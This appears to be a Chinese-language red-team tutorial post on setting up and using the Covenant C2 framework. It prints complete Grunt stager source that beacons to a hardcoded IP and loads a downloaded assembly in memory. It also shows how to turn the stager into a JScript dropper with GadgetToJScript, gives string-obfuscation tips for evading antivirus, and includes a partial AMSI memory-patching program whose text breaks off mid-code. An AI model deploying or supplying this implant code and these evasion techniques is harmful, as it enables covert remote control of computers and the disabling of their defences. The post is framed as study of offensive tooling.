Covenant
========

前言
--

C2技术在红蓝对抗种，重要性不言而喻，现在师傅们热衷于CobaltStrike，它确实是一个不错的C2。

但是因为一些付费等等方面的原因，使用起来也不是很方便。

今天学习一下Covenant，一款源码级别的 Csharp C2，向师傅们致敬！

抱着学习的态度 写的就啰嗦了一点，望师傅们见谅！

优点
--

1.它是基于Windows系统，开发语言是Csharp，属于微软的东西

2.DotNet版本要求 &gt; 3.5，使用Windows .NET的好处是：它支持静默安装

命令

```php
dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackageFullX64Bootstrapper

/q静默安装

/norestart 不要重启
```

3.可扩展性特别强，因为它本身提供了很多API接口 和 自定义功能

安装
--

Covenant它也分本地安装和docker安装(推荐后者)

具体可以看这里：<https://github.com/cobbr/Covenant/wiki/Installation-And-Startup>

以docker安装作为演示

注：需要科学上网

```php
sudo apt install proxychains4
sudo apt install vim
sudo vim /etc/proxychains4.conf

proxychains git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
sudo docker build -t covenant .
```

![image-20211116143606279](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-73a46961f5bd63bb379e147bf99ece406815cc78.png)

启动
--

```php
sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant

-it参数:Docker参数，在交互式tty中开始Covenant，如果不想附加到tty，可以将其排除

-p参数:将端口公开到Covenant Docker容器。这个是必须将公开端口7443和要启动侦听器的任何其他端口。

-v参数:在主机和容器之间创建一个共享的数据目录
要指定数据目录的绝对路径，不能使用相对路径
注:一定要把Covenant映射到Docker镜像里面对应的目录，如果没有的话，就跑不起来，因为所有的功能模块都在Data目录里面
```

注：移除所有Covenant数据并进行初始化恢复

执行命令：

```php
docker rm covenant docker run -it -p 7443:7443 -p 80:80 -p 443:443 --namecovenant -v :/app/Data covenant--username AdminUser --computername 0.0.0.0
```

![image-20211116144504740](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3de5da3f87eba8b8180e07bdfb15bfe613990462.png)

报错 80端口被占用

![image-20211116152808788](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0536ce69e80d6d9f6275b5bb2888ff27ac7e2d13.png)

```php
sudo netstat -nultp

sudo service apache2 stop
#关闭Apache2服务
```

![image-20211116152843034](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20ac82ec97ac65f8bf2f197880664a2c3e65956a.png)

重新启动一下

这次指定一下本地的 IP

```php
sudo docker run -d -p 127.0.0.1:7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant
```

![image-20211116154050851](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d92ce8e5415a3758f5b30b208c5935d53534ef64.png)

```php
sudo docker ps -l
```

![image-20211116154111984](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-072052678b5bd841f2fd91cc5a0b293caf94ab24.png)

docker命令小合集
-----------

```php
docker images      列出所有镜像
docker rmi -f id   删除镜像id

docker ps          列出所有容器
docker ps -a       查看曾经运行的容器
docker rm -f id    删除容器
```

访问

```php
https://127.0.0.1:7443
```

刚开始 会让我们 注册一个用户

![image-20211116154419034](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-366ea8faeaa6dc3a0e2077fef4f940e56bc3650b.png)

成功登录

![image-20211116154605379](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6c2cca5e007f059a8728abab80948b80b81b4b06.png)

实操使用
----

### Listeners

#### 创建监听

![image-20211116154638067](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-954faaf04a73cb18e87ba804f669aafacc42330b.png)

![image-20211116155132074](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-864c309e9a5ea9cb78b583723bf5672fc6c93aa6.png)

![image-20211116155227117](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f37ccd63c3e5633e26d723afe59c696af10c5a3a.png)

注：这里HttpProfile 我选择的是：DefaultHttpProfile

创建完成

![image-20211116172121285](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-abc9dee0923d64d55406c5ad6db0970ef7651989.png)

默认的HttpProfile

可以看到有四个

![image-20211116155359092](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9481928b71edd1787148d40a25c46cbd8e4b2331.png)

可以打开新页(open Link in new Tab)去看一下

#### DefaultHttpProfile

![image-20211116155958543](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-08316de596d8c4eca5bfc18de86de09e348a0273.png)

![image-20211116160228862](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a34fc4743706d92574e764b6725c2c9775fbc1ec.png)

![image-20211116160650459](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-08b316f3a117abc6375d1181294c9884efc02550.png)

![image-20211116160831693](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6c6f0759fa7680cbf757598251f432ed5c49f6e.png)

![image-20211116160923536](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e8ce52346bfce89136e45eb2f6393e0a49859b9.png)

#### CustomHttpProfile

![image-20211116161132509](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c137fbbe184c9a9027a95ea982374b2e4203ec2d.png)

下面基本是一样的

#### TCPBridgeProfile

具体写法可以参考这里：<https://github.com/cobbr/C2Bridge>

相当于一个模板

![image-20211116201203590](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ad210b9c2223acbbd38a48949aef66d75e3f6dc0.png)

![image-20211116201228257](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-17f63768771b27508a0427c5b84dc75bd15fde05.png)

### Launchers

![image-20211116171330129](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8c671ca409d2751f096de93c5a84a4603b804462.png)

注：这10个生成方式 现在都是被杀软拦截的

以Binary为例

![image-20211116171603383](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68a0c696e6aa8f651df37b5006b3a401013fb079.png)

![image-20211116171754263](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-be96f9b1747c6aeaca8d3433baba9dfd960177e5.png)

![image-20211116171907191](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0c0c411e0bf33d1aa806a5225a9cb5b7c312691a.png)

![image-20211116172623966](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71bbb2be3af63af577fa8717a530a35f29d95f26.png)

### Templates

![image-20211116173001083](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b425da665ea181def45023eb1bd3693880be14fe.png)

### 上线测试

注：本地测试学习 杀软就关掉了

### Grunts

![image-20211116172859334](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bff21b24958aeb30bed49b5b46e35f61bcce5680.png)

上线之后呢

会有一个提示

![image-20211116191256608](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1d5275b406ab1c9703c5e2ea0a22075fa87321b8.png)

![image-20211116191415887](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aa0839aac4c7406d822b2acbabf699888df8358a.png)

点一下 Name 即可进入交互界面

![image-20211116191533576](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-49e62b20fb434e76c724e2df6a8c6f6c7cb75dcc.png)

下面这些 都是可以修改的

![image-20211116191605612](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b6ab76629aac67ecd7f864b704ac34eb48e3760f.png)

![image-20211116191703103](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2e21c8110bfb135dfea4fc52d2a0b3c697ccb6c4.png)

![image-20211116192418284](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc86727c4a143b9255a335649bdc6629c8c27600.png)

![image-20211116191807909](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8fb3074b54e71a1c4609c9d4f3adf399957d45a.png)

默认有很多默认的 可以执行的任务

![image-20211116191848773](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f46f284b9c36becf0e935d9b57889215371aa64.png)

![image-20211116192453186](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ff042cdbe257b8ca070606281c25c8dbc0a9d904.png)

### Tasks

![image-20211116192908958](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f04bbaa831c46634adc0b4a232bc66181df3be1.png)

![image-20211116192932611](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-035de06b96fbab15a62758f956c3bc3c0f4ffbb5.png)

![image-20211116193020620](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-540f146fe7f4a1f521619605eb3cdc1da8089ffa.png)

![image-20211116193139007](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e7b1fb0e88f2b918f65ba5aedd712c827730255.png)

![image-20211116193216188](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-066d9f234af1a2b4a78898623cc8b5537354ee1b.png)

![image-20211116193259524](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6465a29ab5c254c347b256636294ee8faf5246b0.png)

### Taskings

历史执行过的命令

![image-20211116193505600](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba73d819c13bb055fdfbef41c871e9a25e6a97ec.png)

### Graph

![image-20211116193551833](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-43178fc3fe967c5fb785fa993a61cf381631c3ff.png)

### Data

实际获取到的内容

![image-20211116193718881](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-33935b214e5d7769f82df1dbc564cbdff3561fb1.png)

![image-20211116193918449](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-77ba5f3a604727c399304dcbdfb2dea0364f183a.png)

![image-20211116194034104](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-99c2a0cb397c8ee787db644d201351a6e55c3422.png)

![image-20211116194056475](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0fd7a47c036898ea47dae49d7ec69fa3943ef998.png)

### Users

![image-20211116192710648](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6649c1e8e7b3d85d61961e61aaf8be2b7e46a82a.png)

<https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html>

这里是会弹一个MessageBox提示窗口

![image-20211116231735243](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9f95761c43beb90e37a0ee8f1f3dffbf5e6425f.png)

![image-20211116232230639](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5edd28458ce7620eb8428c6bb2bc150f3f007c25.png)

![image-20211116232752194](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7e444b4978745ff6d85933078741a69a7e585d9c.png)

```php
1:判断传入的dllstring不为空

2:一个循环 将传入的dll按`,`分隔

3:循环添加refdll
```

![image-20211116234124628](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-937e6f4dad57c14bf3ded3fc8c82835c72dec85f.png)

![image-20211116233150225](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39045d88117d91e317248056d593428cc11cc1ee.png)

![image-20211116233331348](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b4efed51789d1a6153986a4445e74095369d0fc8.png)

继续

![image-20211116233827330](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bc39a63b59a1231a3c24a1c4e1ff5511770358c2.png)

![image-20211116234308557](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-90eb8413552357d355e6f130c4fd497f8041b9b1.png)

重新生成解决方案

继续

把Covenant的Binary Launcher的Code源码 扒过来

![image-20211117170624875](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b7513525fe000a142e8a18e3ce425875538bf1f4.png)

这里贴一下 方便一些

```php
using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace GruntStager
{
    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }
        public static void Execute()
        {
            new GruntStager();
        }
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"http://192.168.175.209:80".Split(',').ToList();
                string CovenantCertHash = @"";
                List<string> ProfileHttpHeaderNames = @"VXNlci1BZ2VudA==,Q29va2ll".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpUrls = @"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                string ProfileHttpPostRequest = @"i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"<html>
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <p>Hello World!</p>
        // Hello World! {0}
    </body>
</html>".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"false");
                bool UseCertPinning = bool.Parse(@"false");

                Random random = new Random();
                string aGUID = @"518387fa18";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"rrONV/NTSPl4sU0FVzoK1TxidURN/ORaK0Yh6sMzG24=");
                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes SetupAESKey = Aes.Create();
                SetupAESKey.Mode = CipherMode.CBC;
                SetupAESKey.Padding = PaddingMode.PKCS7;
                SetupAESKey.Key = SetupKeyBytes;
                SetupAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    bool valid = true;
                    if (UseCertPinning && CovenantCertHash != "")
                    {
                        valid = cert.GetCertHashString() == CovenantCertHash;
                    }
                    if (valid && ValidateCert)
                    {
                        valid = errors == System.Net.Security.SslPolicyErrors.None;
                    }
                    return valid;
                };
                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                CookieWebClient wc = null;
                string Stage0Response = "";
                wc = new CookieWebClient();
                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string CovenantURI = "";
                foreach (string uri in CovenantURIs)
                {
                    try
                    {
                        for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                        {
                            if (ProfileHttpHeaderNames[i] == "Cookie")
                            {
                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));
                            }
                            else
                            {
                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));
                            }
                        }
                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
                        CovenantURI = uri;
                    }
                    catch
                    {
                        continue;
                    }
                }
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                {
                    if (ProfileHttpHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                    }
                }
                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string message64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SetupAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);

                Aes SessionKey = Aes.Create();
                SessionKey.Mode = CipherMode.CBC;
                SessionKey.Padding = PaddingMode.PKCS7;
                SessionKey.Key = FullyDecrypted;
                SessionKey.GenerateIV();
                hmac = new HMACSHA256(SessionKey.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncryptedChallenge1);

                string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));

                string Stage1Response = "";
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                {
                    if (ProfileHttpHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                    }
                }
                Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessionKey.GenerateIV();
                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncryptedChallenge2);

                string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));

                string Stage2Response = "";
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                {
                    if (ProfileHttpHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                    }
                }
                Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
        }

        public class CookieWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        public static class MessageTransform
{
    public static string Transform(byte[] bytes)
    {
        return System.Convert.ToBase64String(bytes);
    }
    public static byte[] Invert(string str) {
        return System.Convert.FromBase64String(str);
    }
}

    }
}
```

注：这里可以把路径简写 看着方便点

```php
prompt study
cd 查看目录
```

打开vs studio开发者模式

![image-20211117170511975](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac51a92b7bb03edfe0ae51ed6736bb1cee82d0b1.png)

![image-20211116235559754](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9d5a17e4761e1c3d560e4039b658a46f2499f9e6.png)

切换目录

编译cs文件

```php
csc /t:exe Grunt.cs
```

![image-20211117180733672](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c10735fcdaf7fe36e4e61ec66a9fdad1e861eff6.png)

执行一下

![image-20211117180858385](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5af7b22bc837bbaad78f9f0f352618ab5f6cd29.png)

上线了

![image-20211117180934799](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c0c110f5455379368e6d4b2dbcc1b17d69630ec8.png)

GadgetToJScript
===============

前言
--

GadgetToJScript是一个Csharp的项目：<https://github.com/med0x2e/GadgetToJScript>

Covenant是一个`.NET`开发的C2(Command and Control)框架，旨在突出`.NET`的攻击面，并充当红队成员的协作命令和控制平台

使用`.NET  Core`的开发环境，不仅支持Linux，MacOS和Windows，还支持docker容器

Covenant是支持动态编译，能够将输入的C#代码上传至C2 Server，获得编译后的文件并使用Assembly.Load()从内存进行加载

GadgetToJscript用于生成`.NET`序列化的工具，当使用基于JS/VBS/VBA脚本中的BinaryFormatter反序列化时，该工具可以触发`.NET`程序集加载/执行，同时相比James Forshaw的DotNetToJScript添加了绕过.Net 4.8+阻止`Assembly.Load`的功能。

两者结合学习

实操
--

下载的GadhetToJscript项目用Vistual Studio 2019打开

GadgetToJscript的编译过程属于动态编译，里面涉及到很多DLL的引用

定位到TestAssemblelyLoader.cs文件

编译生成GadgetToJScript.exe

由于grunt.cs代码中有两个命名空间不被包含在System.dll里

```php
1、System.Linq;

2、System.IO.Pipes;
```

它们在System.Core.dll里，所以调用的时候我们需要手动添加System.Core.dll，在命令行输入：

```php
GadgetToJScript.exe -w js -f Grunt.cs -d System.Core.dll -o matrix

-w 是输出文件的格式
-d 是需要添加的dll，如果有多个可以用逗号隔开
-f 是我们引入的csharp文件，这里我们选择刚才的 grunt.cs 测试
-o 是输出的文件名
然后我们会得到名为matrix.js的文件，打开matrix.js文件。
```

![image-20211119221843448](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-472bd1431aeb7812eeef142307f731b1ba537413.png)

分析一下这个js文件

```php
stage_1:为了绕过Win10中对Assembly.load的限制
stage_2:加载的核心程序集
```

![image-20211119221910019](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8875560a82777a3d3d666fbd559215c9cc6d518.png)

测试js文件，运行

```php
cscript matrix.js
```

JS文件的混淆免杀Tips
-------------

杀软一般标记的是变量名、字符串

1.针对字符串，可以把双引号和单引号去掉

比如

```php
原先
("aaa")

转换成
(/aaa/.source)
```

2.针对一些转义问题

原先 双引号中的`\\`就要替换成`\`

举例

```php
原先的路径
("D:\\7-Zip\\1\\")

转换成
(/D:\7-Zip\1/.source + '\\')
```

![image-20211119222704258](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f3aa9355c0ed83588d29a28bab4e2ed8330fe0c.png)

内存修补Bypass AMSI
---------------

主要思路是通过找到内存中AmsiScanBuffer函数的位置，然后通过patch，让AmsiScanBuffer这个函数不再继续运行，直接在函数的开始让它返回一个0

后来微软进行了一次更新对`.NET`程序集AmsiScanBuffer的扫描结果必须返回一个有效值

`0xb8, 0x57, 0x00, 0x07, 0x80`，同时要加上0xC3（0xC3是return）

PatchAmsi.cs代码如下：

```php
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AMSI
{
  public class Program
    {

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            new Program();
        }

        public Program()
        {
            Patch();
        }

        public static void Patch()
        {
            // Console.WriteLine("-- AMSI Patching");
            //Console.WriteLine("-- Paul (@am0nsec)\n");

            // Get the DllCanUnload function address
            IntPtr hModule = LoadLibrary("amsi.dll");
            //Console.WriteLine("[+] AMSI DLL handle: " + hModule);

            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");//AmsiScanBuffer
            //Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);

            // Dynamically get the address of the function to patch
            byte[] egg = { };
            if (IntPtr.Size == 8)
            {
                egg = new byte[] {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                };
            }
            else
            {
                egg = new byte[] {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
                };
            }
            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
            // Console.WriteLine("[+] Targeted address: " + address);

            // Change the memory protection of the memory region 
            // PAGE_READWRITE = 0x04
            uint oldProtectionBuffer = 0;
            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);

            // Patch the function
            byte[] patch = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, address, 6);

            // Reinitialise the memory protection of the memory region
            uint a = 0;
